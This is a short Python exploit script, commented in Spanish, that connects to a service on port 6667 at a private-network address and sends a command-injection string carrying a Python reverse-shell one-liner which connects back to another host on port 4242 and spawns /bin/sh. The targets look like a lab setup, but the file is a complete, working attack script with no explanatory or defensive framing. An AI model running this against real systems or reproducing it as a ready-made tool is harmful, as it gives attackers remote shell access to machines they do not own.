import socket

class Exploit:
    """Clase que representa un exploit para un servicio en red.

    Attributes:
        host (str): Dirección IP o nombre del host del servidor objetivo.
        port (int): Número de puerto del servidor objetivo.
        sock (socket.socket): Objeto socket utilizado para la conexión con el servidor.
    """

    def __init__(self, host, port):
        """Inicializa una nueva instancia de la clase Exploit.

        Args:
            host (str): Dirección IP o nombre del host del servidor objetivo.
            port (int): Número de puerto del servidor objetivo.
        """
        self.host = host
        self.port = port
        self.sock = None

    def connect(self):
        """Establece conexión con el servidor remoto.

        Returns:
            bool: True si la conexión fue exitosa, False en caso contrario.
        """
        try:
            self.sock = socket.create_connection((self.host, self.port))
            self.sock.recv(1024)
            return True
        except Exception as e:
            print(f"Error al conectarse a {self.host} en el puerto {self.port}: {e}")
            return False

    def send_command(self, command):
        """Envía un comando al servidor y recibe la respuesta.

        Args:
            command (str): Comando para enviar al servidor.

        Returns:
            str: Respuesta del servidor o None si ocurre un error.
        """
        try:
            self.sock.sendall(command.encode('utf-8'))
            return self.sock.recv(1024).decode('utf-8')
        except Exception as e:
            print(f"Error al enviar el comando {command}: {e}")
            return None

    def exploit(self):
        """Envía un payload de exploit al servidor y muestra la respuesta.
        """
        payload = ("python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
                   "s.connect((\"192.168.138.135\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
                   "os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'")
        respuesta = self.send_command(f"AB; {payload} \n")
        print(f"Exploit enviado. Respuesta del servicio: {respuesta}")

    def run(self):
        """Método principal para ejecutar el exploit.
        """
        if self.connect():
            self.exploit()


if __name__ == "__main__":
    exploit = Exploit("192.168.138.130", 6667)
    exploit.run()